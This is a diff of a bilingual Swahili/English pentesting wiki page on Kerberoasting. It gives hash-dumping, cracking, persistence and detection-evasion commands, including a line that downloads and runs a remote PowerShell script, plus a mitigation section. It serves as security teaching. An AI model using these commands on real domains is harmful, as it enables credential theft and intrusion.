@@ -4,147 +4,169 @@
 
 ## Kerberoast
 
-Kerberoasting inazingatia upatikanaji wa **TGS tickets**, hasa zile zinazohusiana na huduma zinazofanya kazi chini ya **akaunti za mtumiaji** katika **Active Directory (AD)**, ikiondoa **akaunti za kompyuta**. Uthibitisho wa tiketi hizi unatumia funguo zinazotokana na **nywila za mtumiaji**, ikiruhusu uwezekano wa **kuvunja akidi za ofline**. Matumizi ya akaunti ya mtumiaji kama huduma yanaonyeshwa na mali isiyo tupu ya **"ServicePrincipalName"**.
+Kerberoasting inazingatia upatikanaji wa **TGS tickets**, hasa zile zinazohusiana na huduma zinazofanya kazi chini ya **akaunti za mtumiaji** katika **Active Directory (AD)**, ikiondoa **akaunti za kompyuta**. Uthibitishaji wa tiketi hizi unatumia funguo zinazotokana na **nywila za watumiaji**, ikiruhusu uwezekano wa **kuvunja akidi za ofline**. Matumizi ya akaunti ya mtumiaji kama huduma yanaonyeshwa na mali ya **"ServicePrincipalName"** isiyo tupu.
 
 Ili kutekeleza **Kerberoasting**, akaunti ya kikoa inayoweza kuomba **TGS tickets** ni muhimu; hata hivyo, mchakato huu hauhitaji **privileges maalum**, na hivyo inapatikana kwa mtu yeyote mwenye **akidi halali za kikoa**.
 
 ### Key Points:
 
-- **Kerberoasting** inalenga **TGS tickets** kwa **huduma za akaunti za mtumiaji** ndani ya **AD**.
-- Tiketi zilizothibitishwa kwa funguo kutoka **nywila za mtumiaji** zinaweza **kuvunjwa ofline**.
+- **Kerberoasting** inalenga **TGS tickets** za **huduma za akaunti za mtumiaji** ndani ya **AD**.
+- Tiketi zilizothibitishwa kwa funguo kutoka **nywila za watumiaji** zinaweza **kuvunjwa ofline**.
 - Huduma inatambulika kwa **ServicePrincipalName** ambayo si null.
 - **Hakuna privileges maalum** zinazohitajika, ni lazima tu **akidi halali za kikoa**.
 
 ### **Attack**
 
 > [!WARNING]
-> **Zana za Kerberoasting** kwa kawaida huomba **`RC4 encryption`** wanapofanya shambulio na kuanzisha maombi ya TGS-REQ. Hii ni kwa sababu **RC4 ni** [**dhaifu**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) na rahisi kuvunjwa ofline kwa kutumia zana kama Hashcat kuliko algorithimu nyingine za uthibitisho kama AES-128 na AES-256.\
-> RC4 (aina 23) hashes huanza na **`$krb5tgs$23$*`** wakati AES-256(aina 18) huanza na **`$krb5tgs$18$*`**.`
+> **Zana za Kerberoasting** kwa kawaida huomba **`RC4 encryption`** wanapofanya shambulio na kuanzisha maombi ya TGS-REQ. Hii ni kwa sababu **RC4 ni** [**dhaifu**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) na rahisi kuvunjwa ofline kwa kutumia zana kama Hashcat kuliko algorithimu nyingine za uthibitishaji kama AES-128 na AES-256.\
+> Hashi za RC4 (aina 23) huanza na **`$krb5tgs$23$*`** wakati AES-256 (aina 18) huanza na **`$krb5tgs$18$*`**.` 
+> Zaidi, kuwa makini kwa sababu ombi la `Rubeus.exe kerberoast` linaomba tiketi kiotomatiki juu ya AKAUNTI ZOTE dhaifu ambazo zitakufanya ugundulike. Kwanza, pata watumiaji wanaoweza kerberoast na privileges za kuvutia kisha uendeshe tu juu yao.
+```bash
 
 #### **Linux**
+
 ```bash
 # Metasploit framework
 msf> use auxiliary/gather/get_user_spns
 # Impacket
-GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
+GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Neno la siri litaombwa
 GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
 # kerberoast: https://github.com/skelsec/kerberoast
-kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
-kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
+kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Tambua watumiaji wa kerberoastable
+kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Toa hashes
 ```
-Vifaa vingi vinavyojumuisha dump ya watumiaji wanaoweza kerberoast:
+
+Multi-features tools including a dump of kerberoastable users:
+
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
 ```
+
 #### Windows
 
-- **Tathmini watumiaji wanaoweza kuingizwa Kerberoast**
-```powershell
-# Get Kerberoastable users
-setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
+- **Enumerate Kerberoastable users**
+
+```bash
+# Pata watumiaji wanaoweza kupewa Kerberoast
+setspn.exe -Q */* #Hii ni binary iliyojengwa ndani. Lenga kwenye akaunti za watumiaji
 Get-NetUser -SPN | select serviceprincipalname #Powerview
 .\Rubeus.exe kerberoast /stats
 ```
-- **Technique 1: Omba TGS na uondoe kutoka kwa kumbukumbu**
-```powershell
-#Get TGS in memory from a single user
-Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local
 
-#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
+- **Technique 1: Ask for TGS and dump it from memory**
+
+```bash
+#Pata TGS katika kumbukumbu kutoka kwa mtumiaji mmoja
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Mfano: MSSQLSvc/mgmt.domain.local
+
+#Pata TGSs kwa AKAUNTI ZOTE zinazoweza kerberoast (PCs zimejumuishwa, si busara sana)
 setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 
-#List kerberos tickets in memory
+#Orodhesha tiketi za kerberos katika kumbukumbu
 klist
 
-# Extract them from memory
-Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
+# Zitoa kutoka katika kumbukumbu
+Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tiketi kwenye folda ya sasa
 
-# Transform kirbi ticket to john
+# Geuza tiketi ya kirbi kuwa john
 python2.7 kirbi2john.py sqldev.kirbi
-# Transform john to hashcat
+# Geuza john kuwa hashcat
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 ```
-- **Technique 2: Zana za kiotomatiki**
+
+- **Technique 2: Automatic tools**
+
 ```bash
-# Powerview: Get Kerberoast hash of a user
-Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
-# Powerview: Get all Kerberoast hashes
+# Powerview: Pata hash ya Kerberoast ya mtumiaji
+Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Kutumia PowerView Ex: MSSQLSvc/mgmt.domain.local
+# Powerview: Pata hashes zote za Kerberoast
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
 
 # Rubeus
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
-.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins
+.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Mtumiaji maalum
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Pata waadmin
 
 # Invoke-Kerberoast
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
-> [!WARNING]
-> Wakati tiketi ya TGS inapotakiwa, tukio la Windows `4769 - Tiketi ya huduma ya Kerberos ilitakiwa` inaundwa.
 
-### Kupasua
+> [!WARNING]
+> When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.
+
+### Cracking
+
 ```bash
-john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
-hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast  
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt  
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
+
 ### Persistence
 
-Ikiwa una **idhini ya kutosha** juu ya mtumiaji unaweza **kufanya iwe kerberoastable**:
+If you have **enough permissions** over a user you can **make it kerberoastable**:
+
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
-Unaweza kupata **zana** muhimu za mashambulizi ya **kerberoast** hapa: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Ikiwa unapata **kosa** hili kutoka Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** ni kwa sababu ya wakati wako wa ndani, unahitaji kusawazisha mwenyeji na DC. Kuna chaguzi chache:
+You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-- `ntpdate <IP of DC>` - Imepitwa na wakati tangu Ubuntu 16.04
+If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:
+
+- `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
 - `rdate -n <IP of DC>`
 
-### Kupunguza
+### Mitigation
 
-Kerberoasting inaweza kufanywa kwa kiwango cha juu cha usiri ikiwa inaweza kutumika. Ili kugundua shughuli hii, umakini unapaswa kulipwa kwa **Kitambulisho cha Tukio la Usalama 4769**, ambacho kinaonyesha kwamba tiketi ya Kerberos imeombwa. Hata hivyo, kutokana na mzunguko mkubwa wa tukio hili, filters maalum zinapaswa kutumika ili kutenga shughuli za kushuku:
+Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:
 
-- Jina la huduma halipaswi kuwa **krbtgt**, kwani hii ni ombi la kawaida.
-- Majina ya huduma yanayomalizika na **$** yanapaswa kutengwa ili kuepuka kujumuisha akaunti za mashine zinazotumika kwa huduma.
-- Maombi kutoka kwa mashine yanapaswa kuchujwa kwa kutengwa kwa majina ya akaunti yaliyoundwa kama **machine@domain**.
-- Ni lazima tu maombi ya tiketi yaliyofanikiwa yazingatiwe, yanayotambulika kwa msimbo wa kushindwa wa **'0x0'**.
-- **Muhimu zaidi**, aina ya usimbaji wa tiketi inapaswa kuwa **0x17**, ambayo mara nyingi hutumiwa katika mashambulizi ya Kerberoasting.
+- The service name should not be **krbtgt**, as this is a normal request.
+- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
+- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
+- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
+- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.
+
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
-Ili kupunguza hatari ya Kerberoasting:
 
-- Hakikisha kwamba **Nywila za Akaunti za Huduma ni ngumu kudhani**, ukipendekeza urefu wa zaidi ya **25 wahusika**.
-- Tumia **Akaunti za Huduma Zinazosimamiwa**, ambazo zinatoa faida kama **mabadiliko ya nywila kiotomatiki** na **Usimamizi wa Jina la Kihuduma (SPN) uliopewa mamlaka**, kuimarisha usalama dhidi ya mashambulizi kama haya.
+To mitigate the risk of Kerberoasting:
 
-Kwa kutekeleza hatua hizi, mashirika yanaweza kupunguza kwa kiasi kikubwa hatari inayohusiana na Kerberoasting.
+- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
+- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.
 
-## Kerberoast bila akaunti ya kikoa
+By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.
 
-Katika **Septemba 2022**, njia mpya ya kutumia mfumo ilifichuliwa na mtafiti anayeitwa Charlie Clark, iliyoshirikiwa kupitia jukwaa lake [exploit.ph](https://exploit.ph/). Njia hii inaruhusu kupata **Tiketi za Huduma (ST)** kupitia ombi la **KRB_AS_REQ**, ambalo kwa ajabu halihitaji udhibiti wa akaunti yoyote ya Active Directory. Kimsingi, ikiwa kiongozi amewekwa kwa njia ambayo haitaji uthibitisho wa awali—hali inayofanana na inavyojulikana katika eneo la usalama wa mtandao kama **AS-REP Roasting attack**—sifa hii inaweza kutumika kubadilisha mchakato wa ombi. Kwa haswa, kwa kubadilisha sifa ya **sname** ndani ya mwili wa ombi, mfumo unadanganywa kutoa **ST** badala ya Tiketi ya Kutoa Tiketi iliyosimbwa (TGT).
+## Kerberoast w/o domain account
 
-Mbinu hii imeelezwa kwa kina katika makala hii: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
+In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).
+
+The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
 > [!WARNING]
-> Lazima utoe orodha ya watumiaji kwa sababu hatuna akaunti halali ya kuuliza LDAP kwa kutumia mbinu hii.
+> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.
 
 #### Linux
 
-- [impacket/GetUserSPNs.py kutoka PR #1413](https://github.com/fortra/impacket/pull/1413):
+- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
+
 ```bash
 GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
 ```
+
 #### Windows
 
-- [GhostPack/Rubeus kutoka PR #139](https://github.com/GhostPack/Rubeus/pull/139):
+- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
+
 ```bash
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
-## Marejeo
+
+## References
 
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
